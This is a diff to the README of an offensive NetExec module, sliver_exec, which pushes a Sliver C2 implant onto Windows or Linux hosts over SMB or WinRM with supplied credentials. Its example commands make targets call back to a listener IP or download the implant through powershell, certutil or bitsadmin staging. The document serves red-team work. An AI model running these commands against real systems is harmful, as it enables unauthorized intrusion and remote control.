@@ -141,17 +141,21 @@ cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/defau
 ```bash
 nxc smb 10.2.10.10 -u localuser -p password \
   -M sliver_exec \
-  -o RHOST=192.168.1.100 RPORT=443
+  -o RHOST=192.168.1.100
 ```
+
+*Note: `RPORT` defaults to 443 if not specified*
 
 ### HTTP Download Staging (Lightweight)
 
 ```bash
 nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
   -M sliver_exec \
-  -o RHOST=10.0.0.5 RPORT=8888 \
-     STAGING=True STAGER_PORT=8080 STAGING_METHOD=powershell
+  -o RHOST=10.0.0.5 \
+     STAGING=True STAGER_PORT=8080
 ```
+
+*Note: `STAGING_METHOD` defaults to powershell, `STAGER_RHOST` defaults to `RHOST`*
 
 **See [USAGE.md](docs/USAGE.md) for detailed examples and options.**
 
@@ -165,15 +169,18 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 
 | Option | Default | Description |
 |--------|---------|-------------|
-| `RHOST` | **Required** | Sliver mTLS listener IP |
-| `RPORT` | `443` | Sliver mTLS listener port |
+| `RHOST` | **Required*** | Sliver mTLS listener IP |
+| `RPORT` | `443` | Sliver mTLS listener port (optional) |
 | `STAGING` | `False` | Enable staging mode |
-| `STAGER_PORT` | None | HTTP port for hosting implant (enables HTTP download staging) |
+| `STAGER_RHOST` | `RHOST` | Staging server IP (defaults to same as RHOST) |
+| `STAGER_PORT` | `8080` | HTTP port for hosting implant (enables HTTP download staging) |
 | `STAGING_METHOD` | `powershell` | Download method: `powershell`, `certutil`, or `bitsadmin` |
 | `OS` | Auto-detect | Target OS (`windows` or `linux`) |
 | `ARCH` | `amd64` | Target architecture |
 | `CLEANUP` | `True` | Remove artifacts after beacon callback |
 | `WAIT` | `90` | Seconds to wait for beacon |
+
+*\* Either `RHOST` or `PROFILE` must be provided*
 
 **Full option reference in [USAGE.md](docs/USAGE.md#advanced-options)**
 
